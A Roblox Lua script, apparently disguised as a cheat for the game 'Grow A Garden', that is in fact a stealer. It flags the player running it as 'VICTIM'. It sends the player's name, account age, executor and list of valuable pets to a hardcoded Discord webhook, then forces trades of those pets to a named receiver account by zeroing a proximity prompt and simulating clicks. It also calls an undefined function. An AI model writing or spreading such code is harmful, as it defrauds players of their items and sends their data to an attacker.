repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")

local VICTIM = Players.LocalPlayer
local USERNAMES = { "ZeeS_Farm01" }
local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"

local PET_WHITELIST = {
    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune'
}

local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
local victimPetTable = {}

local function waitForJoin()
    for _, player in Players:GetPlayers() do
        if table.find(USERNAMES, player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end

local function checkPetsWhitelist(pet)
    for _, name in PET_WHITELIST do
        if string.find(pet, name) then
            return true
        end
    end
end

local function getPetObject(petUid)
    for _, object in ipairs(VICTIM.Backpack:GetChildren()) do
        if object:GetAttribute("PET_UUID") == petUid then
            return object
        end
    end
    for _, object in ipairs(workspace[VICTIM.Name]:GetChildren()) do
        if object:GetAttribute("PET_UUID") == petUid then
            return object
        end
    end
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
    end
    VICTIM.Character.Humanoid:EquipTool(pet)
end

local function deltaBypass()
    local cx = workspace.Camera.ViewportSize.X / 2
    local cy = workspace.Camera.ViewportSize.Y / 2
    VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, nil, false)
    task.wait(0.5)
    VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, nil, false)
end

local function startSteal(trigerName)
    local prompt = Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt")
    if prompt then
        prompt.HoldDuration = 0
        deltaBypass()
    end
end

local function checkPetsInventory(target)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if not checkPetsWhitelist(value.PetType) then continue end
        local petObject = getPetObject(petUid)
        if not petObject then continue end
        equipPet(petObject)
        task.wait(0.2)
        startSteal(target)
    end
end

local function getPlayersPets()
    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
        if checkPetsWhitelist(value.PetType) then
            table.insert(victimPetTable, value.PetType)
        end
    end
end

local function sendWebhook(callback)
    local embed = {
        title = "ğŸŒµ Grow A Garden Hit - DARK SKIDS ğŸ€",
        color = 65280,
        fields = {
            {
                name = "ğŸ‘¤ **Player Information**",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                    VICTIM.Name,
                    table.concat(USERNAMES, " "),
                    identifyexecutor(),
                    VICTIM.AccountAge
                ),
                inline = false
            },
            {
                name = "ğŸ’° **Total Value**",
                value = string.format("```%sÂ¢```", "100000"),
                inline = false
            },
            {
                name = "ğŸŒ´ **Backpack**",
                value = string.format("```%s```", table.concat(victimPetTable, "\n")),
                inline = false
            },
            {
                name = "ğŸï¸ **Join with URL**",
                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                    game.JobId,
                    game.PlaceId,
                    game.JobId
                ),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }
    local request = http_request or request or HttpPost or syn.request

    task.spawn(function()
        local response = request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })

        if response and (response.StatusCode == 200 or response.StatusCode == 204) then
            callback()
        else
            warn("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞ¸ Ğ² Discord:", response and response.StatusCode, response and response.Body)
        end
    end)
end

local function idlingTarget()
    task.spawn(function()
        while task.wait(0.2) do
            local isTarget, trigerName = waitForJoin()
            if isTarget then
                teleportTarget(trigerName)
                checkPetsInventory(trigerName)
            end
        end
    end)
end

getPlayersPets()

sendWebhook(function()
    task.spawn(function()
        while task.wait(0.5) do
            if #victimPetTable > 0 then
                idlingTarget()
                break
            end
        end
    end)
end)
